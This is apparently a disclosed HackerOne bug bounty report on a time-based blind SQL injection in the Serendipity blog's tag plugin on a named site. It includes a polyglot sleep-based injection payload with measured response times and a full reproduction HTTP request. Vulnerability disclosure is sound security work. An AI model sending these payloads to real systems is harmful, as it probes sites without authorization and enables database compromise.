# blind sql injection

## Report Details
- **Report ID**: 374027
- **URL**: https://hackerone.com/reports/374027
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-06-29T20:39:25.675Z
- **Disclosed**: 2018-11-09T21:02:58.104Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: hannob

## Vulnerability Information
**Summary:** 
There exists a possibility that your Serendipity installation is vulnerable to a blind sql injection.

**Description:** 
By sending specially crafted SQL commands to `/plugin/tag/` and timing how long it takes for the server to respond, it is quite possible that the blog backend is interepreting this as actual SQL commands and not just user input.

For example, if we visit `https://betterscience.org/plugin/tag/peerj` we get all articles tagged with `peerj`. I ran the following timed tests replacing `peerj` with the sql commands below:

```
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/ => 3.276 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.28 s
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/ => 9.298 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.272 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.265 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.25 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.265 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.256 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.437 s
```

## Steps To Reproduce:

Request:
```
GET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://betterscience.org:443/
Cookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendipity[name]=dxctfnid; serendipity[email]=bugbountyspam%40protonmail.com; serendipity[remember]=checked%3D%22checked%22
Host: betterscience.org
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

```
## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

## Impact

Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.

## Attachments
No attachments
